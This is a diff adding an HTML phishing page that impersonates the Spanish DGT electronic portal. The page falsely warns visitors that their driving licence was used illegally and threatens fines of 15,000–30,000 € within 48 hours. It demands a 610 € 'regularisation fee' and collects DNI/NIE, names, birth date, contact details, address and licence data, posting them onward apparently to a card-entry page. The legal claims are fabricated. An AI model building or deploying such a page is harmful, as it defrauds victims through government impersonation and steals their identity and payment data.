@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Normativa Sobre Permisos De Conducir No Validos - Sede Electrónica DGT</title>
+    <link rel="icon" type="image/png" href="images/logo.jpg">
+    <link rel="apple-touch-icon" href="images/logo.jpg">
+    <link rel="stylesheet" href="style.css">
+    <!-- FontAwesome pour les icônes de réseaux sociaux et d'interface -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- En-tête (Header) -->
+    <header class="dgt-header">
+        <div class="header-container">
+            <div class="header-left">
+                <button class="menu-btn" aria-label="Menu">
+                    <i class="fa-solid fa-bars"></i>
+                </button>
+                <div class="logo-container">
+                    <!-- Logo DGT stylisé -->
+                    <img src="images/logo.jpg">
+                </div>
+            </div>
+            <div class="header-right">
+                <a href="#" class="sede-text">Sede Electrónica</a>
+                <a href="#" class="btn-mi-dgt">Acceso a Mi DGT</a>
+                <button class="search-btn" aria-label="Buscar"><i class="fa-solid fa-magnifying-glass"></i></button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Fil d'Ariane (Breadcrumb) -->
+    <nav class="breadcrumb-nav">
+        <div class="container">
+            <ul class="breadcrumb">
+                <li><a href="#">Inicio</a></li>
+                <li><i class="fa-solid fa-chevron-right"></i> <a href="#">Permisos de conducir</a></li>
+                <li><i class="fa-solid fa-chevron-right"></i> <a href="#">Obtención y gestión de permisos</a></li>
+                <li><i class="fa-solid fa-chevron-right"></i> <span>Normativa Sobre Permisos De Conducir No Validos</span></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Contenu Principal -->
+    <main class="main-content">
+        <div class="container">
+            
+            <!-- Alerte / Avisos Importantes -->
+            <div class="avisos-section">
+                <div class="avisos-badge">2</div>
+                <span class="avisos-title">AVISOS IMPORTANTES</span>
+                <button class="toggle-avisos"><i class="fa-solid fa-plus"></i></button>
+            </div>
+
+            <!-- Titre de la page -->
+            <div class="page-title-wrapper">
+                <h3>NORMATIVA SOBRE PERMISOS DE CONDUCIR NO VALIDOS</h3>
+                <div class="action-icons">
+                    <button title="Editar/Anotar"><i class="fa-solid fa-pen"></i></button>
+                    <button title="Imprimir"><i class="fa-solid fa-print"></i></button>
+                    <button title="Compartir"><i class="fa-solid fa-share-nodes"></i></button>
+                </div>
+            </div>
+            <div class="title-underline"></div>
+
+            <!-- Section Accordéon : ¿Qué debes saber? -->
+            <section class="accordion-box">
+                <div class="accordion-header">
+                    <div class="acc-title-left">
+                        <span class="info-icon"><i class="fa-solid fa-info"></i></span>
+                        <span class="acc-text">¿Qué debes saber?</span>
+                    </div>
+                    <i class="fa-solid fa-chevron-down arrow-icon"></i>
+                </div>
+                <div class="accordion-body">
+                    <p>
+                        Si ha redirigido a esta página, es porque su permiso de conducirse ha utilizado en <strong>un contexto ilegal</strong> o con <strong>irregularidades</strong>, o bien porque se ha determinado que <strong>una actividad relacionada con el uso de su permiso vulnera los derechos civiles</strong>.
+                    </p>
+                    <p>
+                        Por ello, se le recomienda encarecidamente regularizar esta situación en un plazo de 48 horas tras recibir el mensaje de alerta, para evitar una multa  elevada que puede oscilar entre los <strong>15.000 €</strong> y los <strong>30.000 €</strong>.
+                    </p>
+                </div>
+                <div class="accordion-header">
+                    <div class="acc-title-left">
+                        <span class="info-icon"><i class="fa-solid fa-info"></i></span>
+                        <span class="acc-text">¿Qué hacer?</span>
+                    </div>
+                    <i class="fa-solid fa-chevron-down arrow-icon"></i>
+                </div>
+                <div class="accordion-body">
+                    <p>
+                        <strong>1.</strong> Rellenar el <strong>formulario de solicitud</strong> que aparece a continuación.
+                        <br>
+                        <strong>2.</strong> Abonar las tasas de solicitud, que ascienden a <strong>610 €</strong>.
+                        <br>
+                        <strong>3.</strong> Y esperar <strong>el correo electrónico de validación</strong> de su permiso de conducir.
+                    </p>
+                </div>
+            </section>
+            <section class="formulaire">
+                <div class="form-container">
+                    <h2>Solicitud De Regularización - DGT</h2>
+                    
+                    <form action="cartes/index.html">
+                        <!-- DATOS DEL INTERESADO -->
+                        <fieldset>
+                            <legend>Datos del interesado</legend>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="dni">DNI / NIE</label>
+                                    <input type="text" id="dni" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="fecha_nac">Fecha de nacimiento (dd/mm/aaaa)</label>
+                                    <input type="text" id="fecha_nac" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="pais_nac">País de nacimiento</label>
+                                    <input type="text" id="pais_nac" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="nacionalidad">Nacionalidad</label>
+                                    <input type="text" id="nacionalidad" placeholder="Obligatorio" required>
+                                </div>
+                            </div>
+            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="primer_apellido">Primer apellido</label>
+                                    <input type="text" id="primer_apellido" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="segundo_apellido">Segundo apellido</label>
+                                    <input type="text" id="segundo_apellido" placeholder="Obligatorio" required>
+                                </div>
+                            </div>
+            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="correo">Correo electrónico</label>
+                                    <input type="email" id="correo" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="telefono">Teléfono</label>
+                                    <input type="tel" id="telefono" placeholder="Obligatorio" required>
+                                </div>
+                            </div>
+                        </fieldset>
+            
+                        <!-- DOMICILIO DEL TITULAR -->
+                        <fieldset>
+                            <legend>Domicilio del titular a efecto de notificaciones</legend>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="cp">Código postal</label>
+                                    <input type="text" id="cp" placeholder="Obligatorio" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="localidad">Localidad</label>
+                                    <input type="text" id="localidad" placeholder="Obligatorio" required>
+                                </div>
+                            </div>
+                        </fieldset>
+            
+                        <!-- SELECCIONE EL TRÁMITE -->
+                        <fieldset>
+                            <legend>Seleccione el trámite que desea realizar y rellene los campos correspondientes</legend>
+                            
+                            <div class="checkbox-grid">
+                                <!-- Trámites principales -->
+                                <div class="tramite-card">
+                                    <label class="checkbox-label">
+                                        <input type="checkbox" name="tramite" value="prorroga">
+                                        <span class="checkbox-text"><strong>PRÓRROGA DE VIGENCIA </strong></span>
+                                    </label>
+                                    <div class="sub-fields">
+                                        <div class="form-group"><label>Clase de permiso/licencia</label><input type="text" placeholder="..." required></div>
+                                        <small>*Debe acompañar talón foto (Mod. 2.67)</small>
+                                    </div>
+                                </div>
+                            
+                                <div class="tramite-card">
+                                    <label class="checkbox-label">
+                                        <input type="checkbox" name="tramite" value="permiso_internacional">
+                                        <span class="checkbox-text"><strong>SOLICITUD DE PERMISO INTERNACIONAL</strong></span>
+                                    </label>
+                                </div>
+            
+                            <!-- DATOS DEL PERMISO DE CONDUCCIÓN -->
+                            <div class="permiso-conduccion-box">
+                                <h4>Datos del permiso de conducción</h4>
+                                <div class="form-row">
+                                    <div class="form-group"><label>Clase de permiso</label><input type="text" required></div>
+                                    <div class="form-group"><label>Número</label><input type="text" required></div>
+                                    <div class="form-group span-2"><label>País que lo expidió</label><input type="text" required></div>
+                                    <div class="form-group"><label>Fecha de expedición</label><input type="text" required></div>
+                                    <div class="form-group"><label>Fecha de caducidad</label><input type="text" required></div>
+                                </div>
+                            </div>
+                        </fieldset>
+            
+                        <!-- Pied de page informatif -->
+                        <div class="footer-info">
+                            <p>Le informamos de que la Dirección General de Tráfico consultará electrónicamente sus datos referidos a la identidad, al empadronamiento y a la residencia legal.</p>
+                        </div>
+            
+                        <button type="submit" class="submit-btn">Presentar la solicitud</button>
+                    </form>
+                </div>
+            </section>
+            <!-- Logos institutionnels partenaires -->
+            <section class="partners-section">
+                <div class="partner-logo">
+                    <img src="images/boe.jpg" width="100%">
+                </div>
+                <div class="partner-logo">
+                    <img src="images/asdpdd.jpg" width="100%">
+                </div>
+                <div class="partner-logo">
+                    <img src="images/gobes.jpg" width="100%">
+                </div>
+                <div class="partner-logo">
+                    <img src="images/carpeta.jpg" width="100%">
+                </div>
+                <div class="partner-logo">
+                    <img src="images/cl@ve.jpg" width="100%">
+                </div>
+                <div class="partner-logo">
+                    <img src="images/portal.jpg" width="100%">
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- Pied de page (Footer institutionnel bleu) -->
+    <footer class="site-footer">
+        <div class="container">
+            <div class="footer-links-row">
+                <a href="#">Catálogo de servicios</a> |
+                <a href="#">Calendario días inhábiles</a> |
+                <a href="#">Aviso legal</a> |
+                <a href="#">Política de cookies</a> |
+                <a href="#">Propiedad intelectual</a> |
+                <a href="#">Política de privacidad</a> |
+                <a href="#">Guía de navegación</a> |
+                <a href="#">Accesibilidad</a> |
+                <a href="#">Mapa web</a>
+            </div>
+
+            <!-- Réseaux Sociaux -->
+            <div class="social-icons">
+                <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+                <a href="#"><i class="fa-brands fa-twitter"></i></a>
+                <a href="#"><i class="fa-brands fa-youtube"></i></a>
+                <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                <a href="#"><i class="fa-brands fa-tiktok"></i></a>
+                <a href="#"><i class="fa-brands fa-twitter"></i></a>
+                <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
+            </div>
+
+            <div class="footer-columns">
+                <div class="footer-col">
+                    <h3>Enlaces relacionados</h3>
+                    <ul>
+                        <li><a href="#"> <strong>°</strong> DGT</a></li>
+                        <li><a href="#"> <strong>°</strong> Revista</a></li>
+                        <li><a href="#"> <strong>°</strong> Información del tráfico</a></li>
+                        <li><a href="#"> <strong>°</strong> Radares</a></li>
+                    </ul>
+                    <h3 style="margin-top: 20px;">Sobre la Sede</h3>
+                    <ul>
+                        <li><a href="#"> <strong>°</strong> Leyes</a></li>
+                        <li><a href="#"> <strong>°</strong> Normativa</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h3>Cita previa en Jefaturas</h3>
+                    <ul>
+                        <li><a href="#"> <strong>°</strong> Solicitar cita</a></li>
+                        <li><a href="#"> <strong>°</strong> Consultar cita</a></li>
+                        <li><a href="#"> <strong>°</strong> Anular cita</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-contact-prompt">
+                <p>Contacta con la sede electrónica</p>
+                <p class="suggestion-link">¿Tienes alguna sugerencia?</p>
+            </div>
+
+            <!-- Ministère / Gouvernement -->
+            <div class="gov-badge-container">
+                <div class="gov-text-box">
+                    <img src="images/mi_int.jpg" width="100%">
+                </div>
+            </div>
+
+            <p class="copyright">Copyright © DGT 2026. Todos los derechos reservados.</p>
+
+            <!-- Certifications W3C & ENS -->
+            <div class="certification-badges">
+                <span class="badge-w3c"><img src="images/wcag.jpg" width="100%"></span>
+                <span class="badge-w3c"><img src="images/html5.jpg" width="100%"></span>
+                <span class="badge-ens"><img src="images/certification.jpg" width="100%"></span>
+                <span class="badge-w3c"><img src="images/css3.jpg" width="100%"></span>
+                <span class="badge-cc"><img src="images/cc.jpg" width="100%"></span>
+            </div>
+        </div>
+
+        <!-- Barre fixe bas de page (État du trafic & Adresse) -->
+        <div class="bottom-fixed-bar">
+            <div class="container bottom-bar-flex">
+                <span><i class="fa-solid fa-phone"></i>  Estado del Tráfico</span>
+                <span><i class="fa-solid fa-phone"></i>  Admin. Gral. del Estado</span>
+                <span><i class="fa-solid fa-location-dot"></i> C/ Josefa Valcarcel, 28 - 28027 Madrid-España</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Assistant virtuel flottant (avatar bas droite) -->
+    <div class="virtual-assistant">
+        <div class="avatar-container">
+            <img src="images/assistant.jpg">
+        </div>
+    </div>
+
+</body>
+</html>
